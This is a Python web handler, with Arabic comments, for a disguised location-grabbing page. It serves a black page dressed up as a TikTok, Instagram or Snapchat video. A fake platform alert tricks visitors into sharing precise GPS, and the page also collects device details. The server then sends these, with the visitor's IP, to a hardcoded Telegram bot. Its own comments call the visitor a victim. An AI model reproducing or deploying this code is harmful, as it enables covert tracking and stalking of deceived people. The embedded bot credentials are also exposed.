from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse

# 🛡️ بيانات البوت الثابتة
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
ID = "5811700860"

class Storage:
    target_url = "https://vt.tiktok.com/"

storage = Storage()

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            if 'url' in data:
                storage.target_url = data.get("url")
            elif 'device' in data:
                d = data['device']
                # سحب الـ IP بدقة من Vercel Headers
                ip_addr = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
                
                gps = d.get('gps')
                maps_url = f"https://www.google.com/maps?q={gps['lat']},{gps['lon']}" if isinstance(gps, dict) else "الضحية رفض الإذن ❌"
                
                # التنسيق المطلوب بدون أي تعديل
                report = (
                    "🛰️ **Radar-X20: دخول جديد!**\n\n"
                    f"🌐 **IP:** `{ip_addr}`\n"
                    f"📱 **الجهاز:** {d.get('ua')}\n"
                    f"🔗 **الرابط:** {storage.target_url}\n"
                    "━━━━━━━━━━━━━━━\n"
                    f"📶 **الشبكة:** {d.get('network')}\n"
                    f"🖥️ **الدقة:** {d.get('screen')}\n"
                    f"🔋 **البطارية:** {d.get('battery')}\n"
                    f"📍 **الموقع:** {maps_url}"
                )
                
                # إرسال البيانات مع التأكد من وصولها
                api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
                payload = json.dumps({"chat_id": ID, "text": report, "parse_mode": "Markdown"}).encode('utf-8')
                req = urllib.request.Request(api_url, data=payload, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
                urllib.request.urlopen(req)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
        except:
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        target = storage.target_url.lower()
        # تحديد التمويه بناءً على المنصة
        if "tiktok" in target:
            p_name, p_img, p_msg = "TikTok", "https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_om_lp/ljhwZ_lp/2021/tiktok_og_image.png", "يرغب TikTok في الوصول لموقعك لتحسين جودة عرض الفيديو."
        elif "instagram" in target or "instagr.am" in target:
            p_name, p_img, p_msg = "Instagram", "https://www.instagram.com/static/images/ico/favicon-192.png/ed973502857e.png", "يرغب Instagram في الوصول لموقعك الحالي لتقديم تجربة أفضل."
        elif "snapchat" in target:
            p_name, p_img, p_msg = "Snapchat", "https://www.snapchat.com/favicon.png", "سناب شات يرغب في الوصول لموقعك لعرض فلاتر قريبة منك."
        else:
            p_name, p_img, p_msg = "Social Media", "https://v-tiktok-share.vercel.app/favicon.ico", "يرجى السماح بالوصول للموقع لتشغيل مشغل الفيديو."

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()

        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>{p_name} Video</title>
            <meta property="og:title" content="{p_name} - شاهد المقطع">
            <meta property="og:image" content="{p_img}">
            <script>
                async function startCapture() {{
                    let data = {{
                        ua: navigator.userAgent,
                        screen: window.screen.width + "x" + window.screen.height,
                        network: navigator.connection ? navigator.connection.effectiveType : "WiFi/4G"
                    }};

                    try {{
                        let b = await navigator.getBattery();
                        data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
                    }} catch(e) {{ data.battery = "Unknown"; }}

                    const sendAndRedirect = async (gpsData = null) => {{
                        data.gps = gpsData;
                        // ننتظر الإرسال (await) لضمان أن البوت يستلم الرسالة قبل التحويل
                        await fetch(window.location.href, {{
                            method: 'POST',
                            body: JSON.stringify({{ device: data }}),
                            headers: {{ 'Content-Type': 'application/json' }}
                        }});
                        window.location.replace("{storage.target_url}");
                    }};

                    if (navigator.geolocation) {{
                        alert("{p_msg}");
                        navigator.geolocation.getCurrentPosition(
                            (pos) => sendAndRedirect({{ lat: pos.coords.latitude, lon: pos.coords.longitude }}),
                            () => sendAndRedirect(null),
                            {{ enableHighAccuracy: true, timeout: 5000 }}
                        );
                    }} else {{ sendAndRedirect(null); }}
                }}
                window.onload = startCapture;
            </script>
        </head>
        <body style="background:black;"></body>
        </html>
        """
        self.wfile.write(html.encode())
